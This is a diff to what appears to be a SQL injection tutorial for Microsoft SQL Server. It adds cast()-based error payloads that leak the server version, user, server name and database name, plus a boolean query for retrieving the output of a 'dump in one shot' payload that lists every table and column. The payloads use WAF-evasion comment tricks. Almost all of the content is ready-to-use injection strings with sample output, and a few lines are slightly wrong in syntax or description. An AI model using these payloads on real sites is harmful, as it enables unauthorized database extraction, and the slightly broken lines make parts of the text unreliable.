@@ -217,16 +217,24 @@ We bypassed the WAF and found that the 3nd column has the information.
 ## Dumping database (Boolean string)
 
 ```http://domain.com/index.php?id=1'and 1=convert(int,@@version)--```  
-Error: Warning: mssql_query() message: COnversion failed when converting the nvarchar value "**Microsoft SQL Server 2012 (SP1) - 110.0.3156.0 (X64) Copyright (c) Microsoft Corporation Standard Edition (64-bit) on Windows NT 6.2 X64 (Build 9200: ) (Hypervisor)**" to data type int. (severity 16 in D:\something\web\STD\...\id.php on line...
+```http://domain.com/index.php?id=1'and 1=cast(@@version as int)-- -```  
+Both payloads will return the same error, with the version output.  
+>Error: Warning: mssql_query() message: COnversion failed when converting the nvarchar value "**Microsoft SQL Server 2012 (SP1) - 110.0.3156.0 (X64) Copyright (c) Microsoft Corporation Standard Edition (64-bit) on Windows NT 6.2 X64 (Build 9200: ) (Hypervisor)**" to data type int. (severity 16 in D:\something\web\STD\...\id.php on line...
 
 ```http://domain.com/index.php?id=1'and 1=convert(int,user_name())--```  
-Error: Warning: mssql_query() message: Conversion failed when converting the nvarchar value '**admin_user**' to data type int. (severity 16) in D:\something\web\STD\...\id.php on line...
+```http://domain.com/index.php?id=1'and 1=cast(user_name as int)-- -```  
+Both payloads will return the same error, with the version output.  
+>Error: Warning: mssql_query() message: Conversion failed when converting the nvarchar value '**admin_user**' to data type int. (severity 16) in D:\something\web\STD\...\id.php on line...
 
 ```http://domain.com/index.php?id=1'and 1=convert(int,@@SERVERNAME())--```  
-Error: Warning: mssql_query() message: Conversion failed when converting the nvarchar value '**SERVER_NAME_HERE**' to data type int. (severity 16) in D:\something\web\STD\...\id.php on line...
+```http://domain.com/index.php?id=1'and 1=cast(@@SERVERNAME as int)-- -```  
+Both payloads will return the same error, with the server name output.  
+>Error: Warning: mssql_query() message: Conversion failed when converting the nvarchar value '**SERVER_NAME_HERE**' to data type int. (severity 16) in D:\something\web\STD\...\id.php on line...
 
 ```http://domain.com/index.php?id=1'and 1=convert(int,db_name())--```  
-Error: Warning: mssql_query() message: Conversion failed when converting the nvarchar value '**store_database**' to data type int. (severity 16) in D:\something\web\STD\...\id.php on line...
+```http://domain.com/index.php?id=1'and 1=cast(db_name() as int)-- -```  
+Both payloads will return the same error, with the database name output.  
+>Error: Warning: mssql_query() message: Conversion failed when converting the nvarchar value '**store_database**' to data type int. (severity 16) in D:\something\web\STD\...\id.php on line...
 
 ## Dumping database (UNION based query)
 
@@ -279,8 +287,14 @@ DIOS (dump in one shot), is a long crafted payload which will dump database(), t
 ```
 http://domain.com/index.php?id=1 /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ ;begin declare @x varchar(8000), @y int, @z varchar(50), @a varchar(100) declare @myTbl table (name varchar(8000) not null) SET @y=1 SET @x='injected by rummykhan :: '%2b@@version%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Database : '%2bdb_name()%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62) SET @z='' SET @a='' WHILE @y<=(SELECT COUNT(table_name) from INFORMATION_SCHEMA.TABLES) begin SET @a='' Select @z=table_name from INFORMATION_SCHEMA.TABLES where TABLE_NAME not in (select name from @myTbl) select @a=@a %2b column_name%2b' : ' from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME=@z insert @myTbl values(@z) SET @x=@x %2b  CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Table: '%2b@z%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Columns : '%2b@a%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62) SET @y = @y%2b1 end select @x as output into Kleiton0x00 END--
 ```  
-- No output will be displayed because it is stored into an environment variable. We can access it by using the following payload:  
-```http://domain.com/index.php?id=1 /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,output,4-- -```  
+- No output will be displayed because it is stored into an environment variable. We can access it by using one of the 2 following payload:  
+  
+  Union based query:  
+  ```http://domain.com/index.php?id=1 /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,output,4-- -```  
+
+  Boolean based query:  
+  ```http://domain.com/index.php?id=1 and 1=cast(select output from Kleiton0x00)-- -```  
+
 *NOTE: Replace the vulnerable column number (this case it was **3**). The number is found with UNION based payloads we did on the previous step.*  
 
 - Look at the error message/website, the retrieved informations are shown.
